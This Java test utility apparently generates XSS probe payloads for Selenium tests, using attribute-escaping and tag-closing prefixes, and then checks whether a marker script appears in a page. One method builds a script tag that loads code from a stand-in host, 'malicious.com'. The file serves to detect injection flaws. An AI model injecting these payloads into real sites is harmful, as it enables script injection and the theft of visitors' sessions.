package utils;

import org.openqa.selenium.By;
import org.openqa.selenium.NoSuchElementException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;

public class XssPayload {

    private String payloadString, identifier;

    private XssPayload(String payloadString, String identifier) {
        this.payloadString = payloadString;
        this.identifier = identifier;
    }

    public static XssPayload genOptionPayload() {
        return genCustomXssPayload("Almost vulnerable</option></select>", "<select style=\"display: none\"><option>");
    }

    public static XssPayload genPlainPayload() {
        return genCustomXssPayload("", "");
    }

    public static XssPayload genDoubleQuoteAttributePayload(String tagname, boolean singletag) {
        return getAttributeEscapePayload(tagname, "\"", singletag);
    }

    public static XssPayload genSingleQuoteAttributePayload(String tagname, boolean singletag) {
        return getAttributeEscapePayload(tagname, "'", singletag);
    }

    public static XssPayload genDoubleQuoteAttributePayload(String tagname) {
        return genDoubleQuoteAttributePayload(tagname, false);
    }

    public static XssPayload genSingleQuoteAttributePayload(String tagname) {
        return genSingleQuoteAttributePayload(tagname, false);
    }

    private static XssPayload getAttributeEscapePayload(String tagname, String escape, boolean singletag) {
        return genCustomXssPayload(escape + (singletag ? "/>" : "></" + tagname + ">"), "<" + tagname + " style=\"display: none\" data-fakeattrib=" + escape);
    }

    public static XssPayload genCustomXssPayload(String prefix, String suffix) {
        String identifier = generateIdentifier();
        String payload = prefix + "<script id=\"" + identifier + "\">vulnerable = true;</script>" + suffix;
        return new XssPayload(payload, identifier);
    }

    public static XssPayload genJsonApiPayload(){
        String identifier = generateIdentifier();
        String payload = "<script src='http://www.malicious.com/script.js' id='"+identifier+"'>";
        return new XssPayload(payload, identifier);
    }

    private static String generateIdentifier() {
        return "xsspayload_" + GenericUtils.genRandomString(16);
    }

    public boolean isInText(String text) {
        return text.contains(identifier);
    }

    public boolean isInDocument(WebDriver driver){
        return isInDocumentOrElement(driver, null);
    }

    public boolean isInElement(WebElement element){
        return isInDocumentOrElement(null, element);
    }

    public boolean isTheElement(WebElement element){
        return identifier.equals(element.getAttribute("id"));
    }

    private boolean isInDocumentOrElement(WebDriver driver, WebElement parentElement) {
        String where = parentElement == null ? "document" : "element";
        try {
            if (parentElement == null) {
                driver.findElement(By.id(identifier));
            } else {
                parentElement.findElement(By.id(identifier));
            }
            Logging.i("Payload in "+where+": " + identifier);
            return true;
        } catch (NoSuchElementException e) {
            Logging.w("Payload NOT in "+where+": " + identifier);
            return false;
        }
    }

    @Override
    public String toString() {
        return this.payloadString;
    }

}
